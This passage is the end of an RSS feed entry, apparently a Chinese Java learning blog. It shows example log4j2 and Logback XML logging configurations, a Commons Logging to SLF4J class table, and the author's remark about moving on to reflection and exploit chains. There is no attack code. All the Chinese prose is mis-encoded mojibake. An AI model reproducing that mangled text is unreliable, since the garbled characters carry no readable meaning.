&lt;p>ä½¿ç”¨Log4jæ—¶åªéœ€æŠŠä¸€ä¸ª&lt;code>log4j2.xml&lt;/code>çš„æ–‡ä»¶æ”¾åˆ°&lt;code>classpath&lt;/code>ä¸‹å°±å¯ä»¥è®©Log4jè¯»å–é…ç½®æ–‡ä»¶å¹¶æŒ‰ç…§æˆ‘ä»¬çš„é…ç½®æ¥è¾“å‡ºæ—¥å¿—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;Configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Properties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰æ—¥å¿—æ ¼å¼ --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;log.pattern&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>%d{MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36}%n%msg%n%n&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰æ–‡ä»¶åå˜é‡ --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file.err.filename&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>log/err.log&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Property&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file.err.pattern&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>log/err.%i.log.gz&lt;span style="color:#f92672">&amp;lt;/Property&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Properties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰Appenderï¼Œå³ç›®çš„åœ° --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Appenders&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰è¾“å‡ºåˆ°å±å¹• --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Console&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;console&amp;#34;&lt;/span> &lt;span style="color:#75af00">target=&lt;/span>&lt;span style="color:#d88200">&amp;#34;SYSTEM_OUT&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- æ—¥å¿—æ ¼å¼å¼•ç”¨ä¸Šé¢å®šä¹‰çš„log.pattern --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;PatternLayout&lt;/span> &lt;span style="color:#75af00">pattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${log.pattern}&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Console&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å®šä¹‰è¾“å‡ºåˆ°æ–‡ä»¶,æ–‡ä»¶åå¼•ç”¨ä¸Šé¢å®šä¹‰çš„file.err.filename --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;RollingFile&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;err&amp;#34;&lt;/span> &lt;span style="color:#75af00">bufferedIO=&lt;/span>&lt;span style="color:#d88200">&amp;#34;true&amp;#34;&lt;/span> &lt;span style="color:#75af00">fileName=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${file.err.filename}&amp;#34;&lt;/span> &lt;span style="color:#75af00">filePattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${file.err.pattern}&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;PatternLayout&lt;/span> &lt;span style="color:#75af00">pattern=&lt;/span>&lt;span style="color:#d88200">&amp;#34;${log.pattern}&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Policies&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- æ ¹æ®æ–‡ä»¶å¤§å°è‡ªåŠ¨åˆ‡å‰²æ—¥å¿— --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;SizeBasedTriggeringPolicy&lt;/span> &lt;span style="color:#75af00">size=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1 MB&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Policies&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- ä¿ç•™æœ€è¿‘10ä»½ --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;DefaultRolloverStrategy&lt;/span> &lt;span style="color:#75af00">max=&lt;/span>&lt;span style="color:#d88200">&amp;#34;10&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/RollingFile&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Appenders&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Loggers&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Root&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å¯¹infoçº§åˆ«çš„æ—¥å¿—ï¼Œè¾“å‡ºåˆ°console --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AppenderRef&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;console&amp;#34;&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">&amp;lt;!-- å¯¹errorçº§åˆ«çš„æ—¥å¿—ï¼Œè¾“å‡ºåˆ°errï¼Œå³ä¸Šé¢å®šä¹‰çš„RollingFile --&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AppenderRef&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;err&amp;#34;&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Root&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Loggers&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/Configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="slf4jlogback">SLF4J&amp;amp;Logback&lt;/h3>
&lt;p>ç±»ä¼¼ä¸Šé¢é‚£ä¸€å¯¹ï¼Œåšäº†äº›è®¸æ”¹è¿›&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">Commons Logging&lt;/th>
&lt;th style="text-align:left">SLF4J&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">org.apache.commons.logging.Log&lt;/td>
&lt;td style="text-align:left">org.slf4j.Logger&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">org.apache.commons.logging.LogFactory&lt;/td>
&lt;td style="text-align:left">org.slf4j.LoggerFactory&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>ä»ä½¿ç”¨xml&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;CONSOLE&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.ConsoleAppender&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;pattern&amp;gt;&lt;/span>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;span style="color:#f92672">&amp;lt;/pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/appender&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender&lt;/span> &lt;span style="color:#75af00">name=&lt;/span>&lt;span style="color:#d88200">&amp;#34;FILE&amp;#34;&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.RollingFileAppender&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;pattern&amp;gt;&lt;/span>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n&lt;span style="color:#f92672">&amp;lt;/pattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;charset&amp;gt;&lt;/span>utf-8&lt;span style="color:#f92672">&amp;lt;/charset&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/encoder&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;file&amp;gt;&lt;/span>log/output.log&lt;span style="color:#f92672">&amp;lt;/file&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;rollingPolicy&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.FixedWindowRollingPolicy&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;fileNamePattern&amp;gt;&lt;/span>log/output.log.%i&lt;span style="color:#f92672">&amp;lt;/fileNamePattern&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/rollingPolicy&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;triggeringPolicy&lt;/span> &lt;span style="color:#75af00">class=&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;MaxFileSize&amp;gt;&lt;/span>1MB&lt;span style="color:#f92672">&amp;lt;/MaxFileSize&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/triggeringPolicy&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/appender&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;root&lt;/span> &lt;span style="color:#75af00">level=&lt;/span>&lt;span style="color:#d88200">&amp;#34;INFO&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender-ref&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;CONSOLE&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;appender-ref&lt;/span> &lt;span style="color:#75af00">ref=&lt;/span>&lt;span style="color:#d88200">&amp;#34;FILE&amp;#34;&lt;/span> &lt;span style="color:#f92672">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/root&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;/configuration&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;p>å­¦å®ŒåŸºç¡€è¯­æ³•çš„æ„Ÿè§‰æ˜¯çº¦ç­‰äºŽåŒæ—¶å¤å»ºäº†PHP+c+Python+NodeJSï¼Œè™½è¯´æ˜¯é€Ÿé€šï¼Œä½†æ˜¯æ„Ÿè§‰è§¦ç±»æ—é€šï¼Œå¾ˆå¤šä¸œè¥¿éƒ½æ˜Žç™½äº†ï¼ˆå¤§æ¦‚ï¼‰&lt;/p>
&lt;p>6å°æ—¶é€Ÿé€šåŸºç¡€ï¼Œä»Šå¤©å°±å¯ä»¥å­¦åå°„å’Œå…¶å®ƒçš„é«˜çº§ç”¨æ³•äº†ï¼å°±å¯ä»¥è·Ÿé“¾å­äº†ï¼ï¼ï¼&lt;/p>
&lt;p>å¥½è€¶ï¼ï¼ï¼&lt;/p></description></item></channel></rss>